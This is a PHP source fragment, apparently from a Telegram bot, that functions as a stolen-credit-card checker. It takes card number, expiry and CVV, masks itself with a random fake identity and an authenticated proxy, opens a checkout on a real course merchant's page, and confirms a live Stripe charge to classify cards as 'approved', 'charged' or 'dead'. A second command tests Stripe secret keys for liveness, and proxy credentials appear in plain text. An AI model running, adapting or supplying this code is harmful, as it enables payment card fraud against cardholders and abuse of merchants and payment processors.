date_default_timezone_set('Asia/Jakarta');
if ($_SERVER['REQUEST_METHOD'] == "POST"){
extract($_POST);
}
elseif ($_SERVER['REQUEST_METHOD'] == "GET"){
extract($_GET);
}
function GetStr($string, $start, $end){
$str = explode($start, $string);
$str = explode($end, $str[1]);  
return $str[0];
};
$separa = explode("|", $lista);
$cc = $separa[0];
$mes = $separa[1];
$ano = $separa[2];
$cvv = $separa[3];

///////////////////////////////////////////////////////////////////////////////////////////////////////////////

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$cc.'');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: lookup.binlist.net',
'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '');
$fim = curl_exec($ch);
$bank = GetStr($fim, '"bank":{"name":"', '"');
$name2 = GetStr($fim, '"name":"', '"');
$brand = GetStr($fim, '"brand":"', '"');
$country = GetStr($fim, '"country":{"name":"', '"');
$emoji = GetStr($fim, '"emoji":"', '"');
$name1 = "".$name2."".$emoji."";
$scheme = GetStr($fim, '"scheme":"', '"');
$type = GetStr($fim, '"type":"', '"');
$currency = GetStr($fim, '"currency":"', '"');
if(strpos($fim, '"type":"credit"') !== false){
$bin = 'Credit';
}else{
$bin = 'Debit';
}

curl_close($ch);

//===[Randomizing Details]===//

$get = file_get_contents('https://randomuser.me/api/1.2/?nat=us');
preg_match_all("(\"first\":\"(.*)\")siU", $get, $matches1);
$name = $matches1[1][0];
preg_match_all("(\"last\":\"(.*)\")siU", $get, $matches1);
$last = $matches1[1][0];
preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
$email = $matches1[1][0];
preg_match_all("(\"street\":\"(.*)\")siU", $get, $matches1);
$street = $matches1[1][0];
preg_match_all("(\"city\":\"(.*)\")siU", $get, $matches1);
$city = $matches1[1][0];
preg_match_all("(\"state\":\"(.*)\")siU", $get, $matches1);
$state = $matches1[1][0];
preg_match_all("(\"phone\":\"(.*)\")siU", $get, $matches1);
$phone = $matches1[1][0];
preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
$postcode = $matches1[1][0];

# -------------------- [1 REQ] -------------------#


$proxyIP = 'isp2.hydraproxy.com:9989';

//The port that the proxy is listening on.
$proxyPort = '9989';

//The username for authenticating with the proxy.
$proxyUsername = 'saha44424wnhl118659';

//The password for authenticating with the proxy.
$proxyPassword = 'b9Jm8kt8Cyit0dNw';



$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, $proxyIP);

//Set the port.
curl_setopt($ch, CURLOPT_PROXYPORT, $proxyPort);

//Specify the username and password.
curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$proxyUsername:$proxyPassword");
curl_setopt($ch, CURLOPT_URL, 'https://pages.checkoutjoy.com/api/checkout/init');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, "{\"origin\":\"CHECKOUT_PAGE\",\"company\":\"0f453678-95ad-407c-8bba-e04e7bb13a23\",\"checkoutUrl\":\"https://payments.tanishapkalsi.com/checkout/reelscourse\",\"extPaymentProcessor\":\"Stripe\",\"paymentTypes\":[],\"total\":500,\"currency\":\"INR\",\"customerId\":\"$email\",\"formValues\":\"[{\"name\":\"email\",\"value\":\"$email\"},{\"name\":\"fullName\",\"value\":\"james smith\"}]\",\"countryCode\":\"IN\",\"sessionId\":\"2GJwwVDYUZ6UBfFsHBjYOEFZgLL\",\"discountTotal\":0,\"subTotal\":500,\"taxTotal\":0,\"couponReservations\":[],\"items\":[{\"id\":\"https://learn.tanishapkalsi.com/offers/xxNzqvxX\",\"total\":500,\"discountTotal\":0}]}");
curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');

$headers = array();
$headers[] = 'Authority: pages.checkoutjoy.com';
$headers[] = 'Accept: */*';
$headers[] = 'Accept-Language: en-US,en;q=0.9';
$headers[] = 'Content-Type: text/plain;charset=UTF-8';
$headers[] = 'Origin: https://payments.tanishapkalsi.com';
$headers[] = 'Referer: https://payments.tanishapkalsi.com/';
$headers[] = 'Sec-Ch-Ua: \"Chromium\";v=\"106\", \"Microsoft Edge\";v=\"106\", \"Not;A=Brand\";v=\"99\"';
$headers[] = 'Sec-Ch-Ua-Mobile: ?1';
$headers[] = 'Sec-Ch-Ua-Platform: \"Android\"';
$headers[] = 'Sec-Fetch-Dest: empty';
$headers[] = 'Sec-Fetch-Mode: cors';
$headers[] = 'Sec-Fetch-Site: cross-site';
$headers[] = 'User-Agent: Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Mobile Safari/537.36 Edg/106.0.1370.47';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

$result1 = curl_exec($ch);
if (curl_errno($ch)) {
    echo 'Error:' . curl_error($ch);
}
curl_close($ch);

$id = trim(strip_tags(getStr($result1,'"id": "','"')));


# -------------------- [2 REQ] -------------------#



$proxyIP = 'isp2.hydraproxy.com:9989';

//The port that the proxy is listening on.
$proxyPort = '9989';

//The username for authenticating with the proxy.
$proxyUsername = 'saha44424wnhl118659';

//The password for authenticating with the proxy.
$proxyPassword = 'b9Jm8kt8Cyit0dNw';



$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, $proxyIP);

//Set the port.
curl_setopt($ch, CURLOPT_PROXYPORT, $proxyPort);

//Specify the username and password.
curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$proxyUsername:$proxyPassword");
curl_setopt($ch, CURLOPT_URL, 'https://pages.checkoutjoy.com/api/stripe/intent');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, "{\"amount\":500,\"currency\":\"INR\",\"paymentMethods\":[\"card\"],\"key\":\"0f453678-95ad-407c-8bba-e04e7bb13a23\",\"description\":\"232240 - $email\",\"customerId\":\"$email\",\"billingType\":\"once\",\"setupFeeAmount\":0,\"period\":\"month\",\"cycles\":null,\"offerId\":\"https://learn.tanishapkalsi.com/offers/xxNzqvxX\",\"offerName\":\"The REELS COURSE\",\"customer\":{\"email\":\"$email\",\"firstName\":\"james\",\"lastName\":\"smith\",\"countryCode\":\"PK\"},\"purchaseId\":\"$id\",\"metadata\":{\"purchaseId\":\"$id\",\"description\":\"232240 - $email\",\"customerId\":\"$email\",\"firstName\":\"james\",\"lastName\":\"smith\",\"ref\":\"232240\",\"countryCode\":\"IN\"}}");
curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');

$headers = array();
$headers[] = 'Authority: pages.checkoutjoy.com';
$headers[] = 'Accept: */*';
$headers[] = 'Accept-Language: en-US,en;q=0.9';
$headers[] = 'Content-Type: application/json';
$headers[] = 'Origin: https://payments.tanishapkalsi.com';
$headers[] = 'Referer: https://payments.tanishapkalsi.com/';
$headers[] = 'Sec-Ch-Ua: \"Chromium\";v=\"106\", \"Microsoft Edge\";v=\"106\", \"Not;A=Brand\";v=\"99\"';
$headers[] = 'Sec-Ch-Ua-Mobile: ?1';
$headers[] = 'Sec-Ch-Ua-Platform: \"Android\"';
$headers[] = 'Sec-Fetch-Dest: empty';
$headers[] = 'Sec-Fetch-Mode: cors';
$headers[] = 'Sec-Fetch-Site: cross-site';
$headers[] = 'User-Agent: Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Mobile Safari/537.36 Edg/106.0.1370.47';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
$result3 = curl_exec($ch);
if (curl_errno($ch)) {
    echo 'Error:' . curl_error($ch);
}
curl_close($ch);

$short = trim(strip_tags(getStr($result3,'"clientSecret":"','_secret')));
$pi = trim(strip_tags(getStr($result3,'"clientSecret":"','"')));

# -------------------- [3 REQ] -------------------#

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://api.stripe.com/v1/payment_intents/$short/confirm");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, "payment_method_data[type]=card&payment_method_data[card][number]=$cc&payment_method_data[card][cvc]=$cvv&payment_method_data[card][exp_month]=$mes&payment_method_data[card][exp_year]=$ano&payment_method_data[guid]=f718d0cc-5489-4c2b-8c28-04d1b06fbed8349167&payment_method_data[muid]=5258db8e-63fe-42fa-a45b-e191c4071a19e96ae4&payment_method_data[sid]=a3da6a6f-da29-4427-853f-a7db902cbe5a58f72a&payment_method_data[pasted_fields]=number&payment_method_data[payment_user_agent]=stripe.js%2F49e79370c%3B+stripe-js-v3%2F49e79370c&payment_method_data[time_on_page]=35076&expected_payment_method_type=card&use_stripe_sdk=true&key=pk_live_51IPeGxIzYT96QS8KAm9CvRbAkHL1aaZ6ul2t31e7HiHWSt0hrzTRgcXJ1cNu4TjPfPqxaD7Fq9P4VX7jmIbhPc9r00WFXsx2s1&client_secret=$pi");
curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');

$headers = array();
$headers[] = 'Authority: api.stripe.com';
$headers[] = 'Accept: application/json';
$headers[] = 'Accept-Language: en-US,en;q=0.9';
$headers[] = 'Content-Type: application/x-www-form-urlencoded';
$headers[] = 'Origin: https://js.stripe.com';
$headers[] = 'Referer: https://js.stripe.com/';
$headers[] = 'Sec-Ch-Ua: \"Chromium\";v=\"106\", \"Microsoft Edge\";v=\"106\", \"Not;A=Brand\";v=\"99\"';
$headers[] = 'Sec-Ch-Ua-Mobile: ?1';
$headers[] = 'Sec-Ch-Ua-Platform: \"Android\"';
$headers[] = 'Sec-Fetch-Dest: empty';
$headers[] = 'Sec-Fetch-Mode: cors';
$headers[] = 'Sec-Fetch-Site: same-site';
$headers[] = 'User-Agent: Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Mobile Safari/537.36 Edg/106.0.1370.47';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

$result2 = curl_exec($ch);
if (curl_errno($ch)) {
    echo 'Error:' . curl_error($ch);
}
$cvc_check = trim(strip_tags(getStr($result2,'"cvc_check":"','"')));
$info = curl_getinfo($ch);
$time = $info['total_time'];
$httpCode = $info['http_code'];
$time = substr($time, 0, 4);
curl_close($ch);



# ---------------------------------------#

 if ((strpos($result2, 'incorrect_zip')) || (strpos($result2, 'Your card zip code is incorrect.')) || (strpos($result2, 'The zip code you supplied failed validation.'))){
sendMessage($chatId, '<u>CARD:</u> <code>'.$lista.'</code>%0A<u>STATUS:</u> <b>CARD APPROVED✅</b>%0A<u>RESPONSE:</u> <b>『 ★ CVV MATCHED ★ 』</b>%0A<u>Bank:</u> '.$bank.'%0A<u>Gateway:</u> <b>Stripe 500 INR Charge</b>%0A<u>Checked By:</u> @'.$username.'<u>%0ATime Taken:</u> <b>'.$time.'s</b>');
}
elseif ((strpos($result2, 'Payment Successful!')) || (strpos($result2, "Thank You.")) || (strpos($result2, 'Donated successfully')) || (strpos($result2, "Thank You For Donation.")) || (strpos($result2, "Your payment has already been processed")) || (strpos($result2, "Success ")) || (strpos($result2, '"type":"one-time"')) || (strpos($result2, "/donations/thank_you?donation_number="))){
sendMessage($chatId, '<u>CARD:</u> <code>'.$lista.'</code>%0A<u>STATUS:</u> <b>CARD APPROVED✅</b>%0A<u>RESPONSE:</u> <b>『 ★ CARD CHARGED✅ ★ 』</b>%0A<u>Bank:</u> '.$bank.'%0A<u>Gateway:</u> <b>Stripe 500 INR Charge</b>%0A<u>Checked By:</u> @'.$username.'<u>%0ATime Taken:</u> <b>'.$time.'s</b>');
}
elseif ((strpos($result2, 'Your card has insufficient funds.')) || (strpos($result2, 'insufficient_funds'))){
sendMessage($chatId, '<u>CARD:</u> <code>'.$lista.'</code>%0A<u>STATUS:</u> <b>CARD APPROVED✅</b>%0A<u>RESPONSE:</u> <b> 『 ★ Insufficient Funds ★ 』 </b>%0A<u>Bank:</u> '.$bank.'%0A<u>Gateway:</u> <b>Stripe 500 INR Charge</b>%0A<u>Checked By:</u> @'.$username.'<u>%0ATime Taken:</u> <b>'.$time.'s</b>');
}
elseif ((strpos($result2, "Your card's security code is incorrect.")) || (strpos($result2, "incorrect_cvc")) || (strpos($result2, "The card's security code is incorrect."))){
sendMessage($chatId, '<u>CARD:</u> <code>'.$lista.'</code>%0A<u>STATUS:</u> <b>CARD APPROVED✅</b>%0A<u>RESPONSE:</u> <b>『 ★ CCN MATCHED ★ 』</b>%0A<u>Bank:</u> '.$bank.'%0A<u>Gateway:</u> <b>Stripe 500 INR Charge</b>%0A<u>Checked By:</u> @'.$username.'<u>%0ATime Taken:</u> <b>'.$time.'s</b>');
}
elseif ((strpos($result2, "Your card does not support this type of purchase.")) || (strpos($result2, "transaction_not_allowed"))){
sendMessage($chatId, '<u>CARD:</u> <code>'.$lista.'</code>%0A<u>STATUS:</u> <b>CARD APPROVED✅</b>%0A<u>RESPONSE:</u> <b>『 ★ Card Doesnt Support Purchase ★ 』</b>%0A<u>Bank:</u> '.$bank.'%0A<u>Gateway:</u> <b>Stripe 500 INR Charge</b>%0A<u>Checked By:</u> @'.$username.'<u>%0ATime Taken:</u> <b>'.$time.'s</b>');
}
elseif ((strpos($result2, "pickup_card")) || (strpos($result2, "lost_card")) || (strpos($result2, "stolen_card"))){
sendMessage($chatId, '<u>CARD:</u> <code>'.$lista.'</code>%0A<u>STATUS:</u> <b>CARD APPROVED✅</b>%0A<u>RESPONSE:</u> <b>「Reported Stolen Or Lost」 ★ 』</b>%0A<u>Bank:</u> '.$bank.'%0A<u>Gateway:</u> <b>Stripe 500 INR Charge</b>%0A<u>Checked By:</u> @'.$username.'<u>%0ATime Taken:</u> <b>'.$time.'s</b>');
}
elseif (strpos($result2, "do_not_honor")){
sendMessage($chatId, '<u>CARD:</u> <code>'.$lista.'</code>%0A<u>STATUS:</u> <b>DEAD❌</b>%0A<u>RESPONSE:</u> <b>『 ★ Declined : Do_Not_Honor ★ 』</b>%0A<u>Bank:</u> '.$bank.'%0A<u>Gateway:</u> <b>Stripe 500 INR Charge</b>%0A<u>Checked By:</u> @'.$username.'<u>%0ATime Taken:</u> <b>'.$time.'s</b>');
}
elseif ((strpos($result2, 'The card number is incorrect.')) || (strpos($result2, 'Your card number is incorrect.')) || (strpos($result2, 'incorrect_number'))){
sendMessage($chatId, '<u>CARD:</u> <code>'.$lista.'</code>%0A<u>STATUS:</u> <b>DEAD❌</b>%0A<u>RESPONSE:</u> <b>『 ★ Incorrect Card Number ★ 』</b>%0A<u>Bank:</u> '.$bank.'%0A<u>Gateway:</u> <b>Stripe 500 INR Charge</b>%0A<u>Checked By:</u> @'.$username.'<u>%0ATime Taken:</u> <b>'.$time.'s</b>');
}
elseif ((strpos($result2, 'Your card has expired.')) || (strpos($result2, 'expired_card'))){
sendMessage($chatId, '<u>CARD:</u> <code>'.$lista.'</code>%0A<u>STATUS:</u> <b>DEAD❌</b>%0A<u>RESPONSE:</u> <b>『 ★ Expired Card ★ 』</b>%0A<u>Bank:</u> '.$bank.'%0A<u>Gateway:</u> <b>Stripe 500 INR Charge</b>%0A<u>Checked By:</u> @'.$username.'<u>%0ATime Taken:</u> <b>'.$time.'s</b>');
}
elseif (strpos($result2, "generic_decline")){
sendMessage($chatId, '<u>CARD:</u> <code>'.$lista.'</code>%0A<u>STATUS:</u> <b>DEAD❌</b>%0A<u>RESPONSE:</u> <b>『 ★ Declined : Generic_Decline ★ 』</b>%0A<u>Bank:</u> '.$bank.'%0A<u>Gateway:</u> <b>Stripe 500 INR Charge</b>%0A<u>Checked By:</u> @'.$username.'<u>%0ATime Taken:</u> <b>'.$time.'s</b>');
}
elseif (strpos($result1, "generic_decline")){
sendMessage($chatId, '<u>CARD:</u> <code>'.$lista.'</code>%0A<u>STATUS:</u> <b>DEAD❌</b>%0A<u>RESPONSE:</u> <b>『 ★ Declined : Generic_Decline ★ 』</b>%0A<u>Bank:</u> '.$bank.'%0A<u>Gateway:</u> <b>Stripe 500 INR Charge</b>%0A<u>Checked By:</u> @'.$username.'<u>%0ATime Taken:</u> <b>'.$time.'s</b>');
}
elseif ((strpos($result2, '"cvc_check":"unavailable"')) || (strpos($result2, '"cvc_check": "unchecked"')) || (strpos($result2, '"cvc_check": "fail"'))){
sendMessage($chatId, '<u>CARD:</u> <code>'.$lista.'</code>%0A<u>STATUS:</u> <b>DEAD❌</b>%0A<u>RESPONSE:</u> <b>『 ★ Security Code Check : '.$cvc_check.' [Proxy Dead/change IP] ★ 』</b>%0A<u>Bank:</u> '.$bank.'%0A<u>Gateway:</u> <b>Stripe 500 INR Charge</b>%0A<u>Checked By:</u> @'.$username.'<u>%0ATime Taken:</u> <b>'.$time.'s</b>');
}
elseif ((strpos($result2, "Your card was declined.")) || (strpos($result2, 'The card was declined.'))){
sendMessage($chatId, '<u>CARD:</u> <code>'.$lista.'</code>%0A<u>STATUS:</u> <b>DEAD❌</b>%0A<u>RESPONSE:</u> <b>『 ★ Card Declined ★ 』</b>%0A<u>Bank:</u> '.$bank.'%0A<u>Gateway:</u> <b>Stripe 500 INR Charge</b>%0A<u>Checked By:</u> @'.$username.'<u>%0ATime Taken:</u> <b>'.$time.'s</b>');
}
elseif ((strpos($result2, "requires_action")) || (strpos($result2, 'status": "requires_action'))){
sendMessage($chatId, '<u>CARD:</u> <code>'.$lista.'</code>%0A<u>STATUS:</u> <b>DEAD❌</b>%0A<u>RESPONSE:</u> <b>『 ★ PROXY ERROR TRY AGAIN ★ 』</b>%0A<u>Bank:</u> '.$bank.'%0A<u>Gateway:</u> <b>Stripe 500 INR Charge</b>%0A<u>Checked By:</u> @'.$username.'<u>%0ATime Taken:</u> <b>'.$time.'s</b>');
}
elseif(!$result2){
sendMessage($chatId, ''.$result2.'');
}else{
sendMessage($chatId, ''.$result2.'');
}
curl_close($ch);
}




//==[Sk Key Check Command]=//

elseif ((strpos($message, "!sk") === 0)||(strpos($message, "/sk") === 0)){
$sec = substr($message, 4);
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/tokens');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, "card[number]=5154620061414478&card[exp_month]=01&card[exp_year]=2023&card[cvc]=235");
curl_setopt($ch, CURLOPT_USERPWD, $sec. ':' . '');
$headers = array();
$headers[] = 'Content-Type: application/x-www-form-urlencoded';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
$result = curl_exec($ch);
if (strpos($result, 'api_key_expired')){
sendMessage($chatId, "<b>❌ DEAD KEY</b>%0A<u>KEY:</u> <code>$sec</code>%0A<u>REASON:</u> EXPIRED KEY");
}
elseif (strpos($result, 'Invalid API Key provided')){
sendMessage($chatId, "<b>❌ DEAD KEY</b>%0A<u>KEY:</u> <code>$sec</code>%0A<u>REASON:</u> INVALID KEY");
}
elseif ((strpos($result, 'testmode_charges_only')) || (strpos($result, 'test_mode_live_card'))){
sendMessage($chatId, "<b>❌ DEAD KEY</b>%0A<u>KEY:</u> <code>$sec</code>%0A<u>REASON:</u> Testmode Charges Only");
}else{
sendMessage($chatId, "<b>✅ LIVE KEY</b>%0A<u>KEY:</u> <code>$sec</code>%0A<u>RESPONSE:</u> SK LIVE!!");
}}


////////////////////////////////////////////////////////////////////////////////////////////////

function sendMessage ($chatId, $message){
$url = $GLOBALS[website]."/sendMessage?chat_id=".$chatId."&text=".$message."&reply_to_message_id=".$message_id."&parse_mode=HTML";
file_get_contents($url);      
}

?>